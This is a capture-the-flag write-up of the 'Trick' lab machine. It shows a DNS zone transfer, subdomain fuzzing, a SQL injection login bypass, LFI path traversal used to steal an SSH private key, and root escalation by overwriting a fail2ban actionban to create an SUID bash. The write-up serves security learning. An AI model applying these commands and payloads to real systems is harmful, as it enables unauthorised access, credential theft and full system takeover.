post_description: "This was an old box I hacked without the notes to create a writeup without rehacking. This box starts with dig-ing for a subdomain which reveals a subdomain naming scheme. After fuzzing for more preprod-FUZZ.trick.htb subdomains marketing can be found which is vulnerable to directory traversal and LFI. With a foothold gained a Fail2ban config file can be overwritten to add a new actionban command to run on failed login attempts as root, compromising the box"

## Port 80

{% include img_link src="/img/trick/trick_80_front_page" alt="front_page" ext="png" trunc=600 %}

I dig around and scan around a bit to no results. Port 25 probably isn't vulnerable either and that will be a last resort to check if all else fails. Notably here port 53 is open and that could give us some more information regarding to subdomains. So to echo the first sentence of this block, I will dig to enumerate DNS through a zone transfer to check for other domain names.

```bash
dig axfr trick.htb @10.10.11.166

That's much better.

Odd, a lot of 200s on things that should redirect or require auth. I tossed the notable ones below.


![preprod-payroll login page]({{ page.img }}_preprod_login_page.png)

![preprod-payroll user.php]({{ page.img }}_preprod_user_php.png)


Those buttons don't do anything, admin username might be useful. No password leak or other information leak. Next thing we have is the login portal to fuzz around with.


![preprod-payroll login sqli]({{ page.img }}_burpsuite_sqli.png)


Well that bodes well. I toss in `Enemigosss' or 1=1#` and get access to the admin account. While running sqlmap I also found some things that I'll toss here but didn't find a use for:

```bash
sqlmap -r sql.req --privileges

'remo'@'localhost'
[*] %remo% [1]:
    privilege: FILE

sqlmap -r sql.req --dbs

[*] information_schema
[*] payroll_db
```

![preprod-payroll admin dashboard]({{ page.img }}_preprod_admin_dashboard.png)

To save some reading and time I fuzz around, try to inject payloads and find out that at worst this application is vulnerable to XSS, but since there's no useful javascript the site makes use of the XSS here would only be good for grabbing cookies which means nothing when we are already admin (potentially the only account).


![preprod-payroll depatment xss]({{ page.img }}_preprod_depatment_xss.png)


Given the naming scheme of this subdomain it is logical to conclude that there might be other preprod- subdomains that this fake organization makes use of. I ffuf for anything with the prefix and behold our next place to test: preprod-marketing

```bash
ffuf -w /opt/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://trick.htb -H "Host: preprod-FUZZ.trick.htb" -mc 200,401 -fs 5480

![preprod-marketing front page*]({{ page.img }}_marketing.png)


While looking around I make note of the url using the page parameter to pass a file location **http://preprod-marketing.trick.htb/index.php?page=services.html**. I fuzz with some directory traversal and find that there is some filtering but it passes through only once which means the classic `..././` will work.

![preprod-marketing lfi etc passwd]({{ page.img }}_etc_passwd.png)


Now that we have every user on the machine we can check for ssh keys. The endpoint here ends up being **http://preprod-marketing.trick.htb/index.php?page=..././..././..././..././..././home/michael/.ssh/id_rsa** and there is an ssh key there which gives us a the user flag.

```bash
wget http://preprod-marketing.trick.htb/index.php?page=..././..././..././..././..././home/michael/.ssh/id_rsa -O id_rsa

chmod 400 id_rsa

ssh michael@trick.htb -i id_rsa

While prodding around the /etc/fail2ban directories we can see that action.d is apart of the security group, and in addition michael is a part of this group.

In searching for fail2ban vulnerabilities I came across [this post about being able to change files within action.d to compromise fail2ban](https://juggernaut-sec.com/fail2ban-lpe/#Finding_that_we_have_Write_Permissions_in_actiond). 

The whole vulnerability here is that with any permissions to edit the action.d directory a user can mv files into that directory and overwrite root protected files. The particular file that enables code execution is **iptables-multiport.conf** which can define a command to run when the actionban is triggered (after failed login attempts). Once the service is restarted and the ban is triggered root will have executed our code. I put all this together below.

```bash
michael@trick:/tmp$ mv /etc/fail2ban/action.d/iptables-multiport.conf  .asdasd
michael@trick:/tmp/test$ nano iptables-multiport.conf
michael@trick:/tmp/test$ cat iptables-multiport.conf 
...
# Option:  actionban
# Notes.:  command executed when banning an IP. Take care that the
#          command is executed with Fail2Ban user rights.
# Tags:    See jail.conf(5) man page
# Values:  CMD
#
#actionban = <iptables> -I f2b-<name> 1 -s <ip> -j <blocktype>
actionban = rm /tmp/bash && cp /bin/bash /tmp && chmod 4755 /tmp/bash
...
```

Now with a command to cp /bin/bash then make it an SUID I can mv the new config file, restart the service, fail an ssh login 5 times, then become root.

```bash
michael@trick:/tmp/test$ mv iptables-multiport.conf /etc/fail2ban/action.d/iptables-multiport.conf 
mv: replace '/etc/fail2ban/action.d/iptables-multiport.conf', overriding mode 0644 (rw-r--r--)? Y
michael@trick:/tmp/test$ sudo /etc/init.d/fail2ban restart
[ ok ] Restarting fail2ban (via systemctl): fail2ban.service.
```

```bash
michael@trick:/tmp/test$ ../bash -p
bash-5.0# cat /root/root.txt
